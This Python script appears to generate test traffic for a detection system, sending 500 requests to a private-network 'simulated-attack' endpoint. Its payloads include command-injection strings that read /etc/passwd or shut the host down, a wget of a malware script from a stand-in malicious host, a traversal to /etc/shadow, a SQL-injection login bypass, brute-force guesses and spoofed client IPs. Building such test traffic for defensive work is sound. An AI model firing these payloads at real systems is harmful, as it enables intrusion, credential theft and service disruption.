import requests
import random
import time
import string

# === Configuration ===
TARGET_URL = "http://172.18.28.72:5000/api/simulated-attack"
TOTAL_ATTACKS = 500
DELAY_BETWEEN_ATTACKS = 0.2  # seconds


# === Helper Functions ===
def generate_random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


# === Attack Variants ===

def simulate_brute_force():
    return {
        "username": random.choice(["admin", "root", "user"]),
        "password": random_string(6),
        "command": ""
    }


def simulate_command_injection():
    cmds = [
        "; ls -la", "`whoami`", "| cat /etc/passwd", "$(shutdown -h now)"
    ]
    return {
        "username": "test",
        "password": "test123",
        "command": random.choice(cmds)
    }


def simulate_malware_download():
    return {
        "username": "guest",
        "password": "guest",
        "command": "wget http://malicious.site/malware.sh"
    }


def simulate_directory_traversal():
    return {
        "username": "guest",
        "password": "guest",
        "command": "../../../../etc/shadow"
    }


def simulate_sql_injection():
    return {
        "username": "admin' OR '1'='1",
        "password": "anything",
        "command": ""
    }


def simulate_normal_usage():
    return {
        "username": "user",
        "password": "safePass123",
        "command": "ls"
    }


# === Fixed Repeated Attack ===
def simulate_fixed_repeat():
    return {
        "username": "repeat_user",
        "password": "repeat_pass",
        "command": "ls -la"
    }


# === Attack Function Pool ===
ATTACK_FUNCTIONS = [
    simulate_brute_force,
    simulate_command_injection,
    simulate_malware_download,
    simulate_directory_traversal,
    simulate_sql_injection,
    simulate_normal_usage
]

# === Simulation Loop ===
for i in range(TOTAL_ATTACKS):
    # 20% chance of a repeated/fixed attack, 80% random
    if i % 5 == 0:
        payload = simulate_fixed_repeat()
        spoofed_ip = "192.168.99.99"
    else:
        payload = random.choice(ATTACK_FUNCTIONS)()
        spoofed_ip = generate_random_ip()

    headers = {
        "Content-Type": "application/json",
        "X-Forwarded-For": spoofed_ip  # simulate different IPs
    }

    try:
        response = requests.post(TARGET_URL, json=payload, headers=headers)
        print(f"[{i + 1}/{TOTAL_ATTACKS}] From {spoofed_ip} | Payload: {payload} | Status: {response.status_code}")
    except Exception as e:
        print(f"[ERROR] Failed to send attack #{i + 1}: {e}")

    time.sleep(DELAY_BETWEEN_ATTACKS)

print("\n[+] Mixed attack simulation complete.")
